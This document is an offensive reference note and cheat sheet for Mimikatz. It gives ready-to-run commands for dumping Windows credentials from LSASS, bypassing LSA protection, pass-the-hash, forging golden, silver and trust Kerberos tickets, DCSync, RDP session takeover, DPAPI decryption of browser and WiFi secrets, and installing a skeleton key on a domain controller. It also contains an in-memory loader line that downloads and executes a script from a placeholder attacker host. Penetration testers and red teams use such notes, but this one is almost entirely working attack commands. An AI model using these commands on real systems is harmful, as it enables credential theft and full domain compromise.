---
title: "Mimikatz Reference"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - mimikatz
  - credentials
  - windows
  - lsass
  - dpapi
---

# Mimikatz Reference

Comprehensive reference for Mimikatz credential extraction, privilege escalation, and post-exploitation. See also: [[AD-Credential-Attacks]], [[AD-Kerberos-Attacks]], [[Windows-Privilege-Escalation-Reference]], [[Active-Directory-Cheatsheet]].

---

## Table of Contents

- [[#Execution Methods]]
- [[#Privilege Escalation]]
- [[#Extract Passwords (sekurlsa)]]
- [[#LSA Protection Bypass]]
- [[#Mini Dump Methods]]
- [[#Pass-the-Hash]]
- [[#Kerberos Tickets]]
- [[#DCSync]]
- [[#RDP Session Takeover]]
- [[#DPAPI]]
- [[#Skeleton Key]]
- [[#Complete Commands Reference]]

---

## Execution Methods

```powershell
# Interactive
.\mimikatz.exe
privilege::debug
log output.txt

# One-liner execution
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# PowerShell in-memory (Invoke-Mimikatz)
IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER>/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:krbtgt"'
```

---

## Privilege Escalation

```
# Enable debug privilege (required for most commands)
privilege::debug

# Token elevation
token::elevate    # Impersonate SYSTEM token
token::whoami     # Show current token
token::list       # List available tokens
token::revert     # Revert to original token
```

---

## Extract Passwords (sekurlsa)

**Requires:** `privilege::debug` or SYSTEM

```
# Dump all logon passwords (cleartext where available)
sekurlsa::logonpasswords

# Dump logon passwords - specific fields
sekurlsa::logonpasswords full

# Dump NTLM hashes only
sekurlsa::msv

# Dump Wdigest (cleartext - only works on older systems or with registry change)
sekurlsa::wdigest
# Enable Wdigest: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Kerberos tickets
sekurlsa::tickets

# Kerberos encryption keys (AES128, AES256, RC4)
sekurlsa::ekeys

# SSP credentials
sekurlsa::ssp

# Live SSP
sekurlsa::livessp

# TsPkg (Remote Desktop)
sekurlsa::tspkg

# Credman (Credential Manager)
sekurlsa::credman
```

---

## LSA Protection Bypass

```
# Check LSA protection status
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# Bypass Protected Process Light (PPL)
!+                    # Load mimidrv.sys
!processprotect /process:lsass.exe /remove   # Remove PPL from lsass
sekurlsa::logonpasswords
```

```powershell
# Alternative: Load vulnerable driver to bypass PPL
# Using PPLdump or similar tools
.\PPLdump.exe lsass.exe lsass.dmp
```

---

## Mini Dump Methods

Dump lsass memory without running mimikatz directly on target.

```powershell
# Method 1: comsvcs.dll (built-in)
$id = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $id lsass.dmp full

# Method 2: ProcDump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
.\procdump.exe -accepteula -ma -r lsass.exe lsass.dmp   # Reflective (clone first)

# Method 3: Task Manager (GUI) - right-click lsass → Create dump file

# Method 4: via SQL Server
# Execute as sqladmin:
# EXEC xp_cmdshell 'powershell -c "Get-Process lsass | %{$_.Modules | where {$_.FileName -like '*comsvcs*'}}"'
```

```bash
# Parse dump offline (Linux)
# pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp --json

# mimikatz offline
.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

---

## Pass-the-Hash

```
# Pass-the-Hash - spawn process with different user's hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH

# Pass-the-Hash with run
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH /run:cmd.exe
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:NTLMHASH /run:powershell.exe

# Pass-the-Key (AES)
sekurlsa::pth /user:administrator /domain:corp.local /aes256:AESKEY /run:cmd.exe
sekurlsa::pth /user:administrator /domain:corp.local /aes128:AESKEY /run:cmd.exe
```

---

## Kerberos Tickets

```
# List tickets
kerberos::list
kerberos::list /export   # Export to .kirbi files

# Import ticket
kerberos::ptt ticket.kirbi
kerberos::ptt <base64_ticket>

# Purge tickets
kerberos::purge

# Generate Golden Ticket
kerberos::golden /user:administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi

# Golden ticket with extra groups
kerberos::golden /user:administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /groups:512,519 /ticket:golden.kirbi

# Golden ticket for cross-domain (child to parent)
kerberos::golden /user:administrator /domain:child.corp.local /sid:CHILD_SID /krbtgt:CHILD_KRBTGT /sids:PARENT_SID-519 /ticket:golden.kirbi

# Silver ticket
kerberos::golden /user:administrator /domain:corp.local /sid:DOMAIN_SID /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /ticket:silver.kirbi

# Pass the ticket
kerberos::ptt golden.kirbi

# Trust ticket (inter-realm)
kerberos::golden /user:administrator /domain:child.corp.local /sid:CHILD_SID /rc4:TRUST_KEY /service:krbtgt /target:corp.local /sids:PARENT_SID-519 /ticket:trust.kirbi
```

---

## DCSync

Simulate DC replication to dump hashes without touching lsass.

**Requires:** Replicating Directory Changes + Replicating Directory Changes All privileges (Domain Admins, Enterprise Admins have these by default).

```
# Dump specific user
lsadump::dcsync /domain:corp.local /user:administrator
lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump all users (noisy)
lsadump::dcsync /domain:corp.local /all

# DCSync remotely
lsadump::dcsync /domain:corp.local /user:administrator /dc:dc01.corp.local

# Dump from specific domain controller
lsadump::dcsync /dc:dc01.corp.local /domain:corp.local /user:administrator
```

```bash
# impacket secretsdump (remote DCSync)
impacket-secretsdump corp.local/administrator:password@<DC_IP>
impacket-secretsdump -hashes :NTLMHASH corp.local/administrator@<DC_IP>
impacket-secretsdump -just-dc corp.local/administrator:password@<DC_IP>
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:password@<DC_IP>
```

---

## SAM / LSA Secrets

```
# Dump local SAM (hashes)
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# Dump LSA cache (domain cached credentials - DCC2)
lsadump::cache

# Combine
lsadump::sam
lsadump::secrets
lsadump::cache
```

---

## RDP Session Takeover

Take over existing RDP sessions without needing credentials.

```
# List RDP sessions
ts::sessions

# Take over session (requires SYSTEM)
ts::remote /id:<SESSION_ID>

# Via token
privilege::debug
token::elevate
ts::sessions
ts::remote /id:1
```

---

## DPAPI

Decrypt Windows Data Protection API encrypted data (passwords, IE credentials, WiFi keys, etc.).

```
# Dump masterkeys
sekurlsa::dpapi

# Decrypt using masterkey
dpapi::blob /in:blob.bin /masterkey:MASTERKEY_HEX

# Chrome passwords (offline)
dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Credential files
dpapi::cred /in:"C:\Users\user\AppData\Roaming\Microsoft\Credentials\CREDFILE"

# Wi-Fi passwords
dpapi::wifi

# Vault credentials
dpapi::vault /cred:"C:\Users\user\AppData\Local\Microsoft\Vault\CREDFILE"

# With system masterkey
dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\MASTERKEY" /password:userpassword
```

---

## Skeleton Key

Patches the LSASS process on a DC to accept a master password ("mimikatz") for ALL users without changing their real passwords.

**Note:** Non-persistent (removed on reboot). Requires DA.

```
# Install skeleton key on DC
misc::skeleton

# Now authenticate with any user using password "mimikatz"
net use \\dc01\admin$ /user:administrator mimikatz
```

---

## Complete Commands Reference

| Module | Command | Description |
|--------|---------|-------------|
| privilege | privilege::debug | Enable SeDebugPrivilege |
| sekurlsa | sekurlsa::logonpasswords | Dump credentials from lsass |
| sekurlsa | sekurlsa::ekeys | Dump Kerberos encryption keys |
| sekurlsa | sekurlsa::tickets | List Kerberos tickets |
| sekurlsa | sekurlsa::pth | Pass-the-Hash |
| kerberos | kerberos::list | List tickets |
| kerberos | kerberos::ptt | Inject ticket |
| kerberos | kerberos::golden | Create Golden Ticket |
| kerberos | kerberos::purge | Purge all tickets |
| lsadump | lsadump::dcsync | DCSync replication |
| lsadump | lsadump::sam | Dump SAM database |
| lsadump | lsadump::secrets | Dump LSA secrets |
| lsadump | lsadump::cache | Dump cached credentials |
| lsadump | lsadump::trust | Dump trust keys |
| lsadump | lsadump::zerologon | ZeroLogon exploit |
| dpapi | dpapi::blob | Decrypt DPAPI blob |
| dpapi | dpapi::chrome | Decrypt Chrome credentials |
| dpapi | dpapi::masterkey | Process masterkey |
| token | token::elevate | Impersonate SYSTEM |
| token | token::list | List available tokens |
| ts | ts::sessions | List RDP sessions |
| ts | ts::remote | Take over RDP session |
| misc | misc::skeleton | Install skeleton key |
| misc | misc::printnightmare | PrintNightmare exploit |
| crypto | crypto::certificates | List/export certs |
| net | net::user | User operations |
| process | process::suspend | Suspend process |
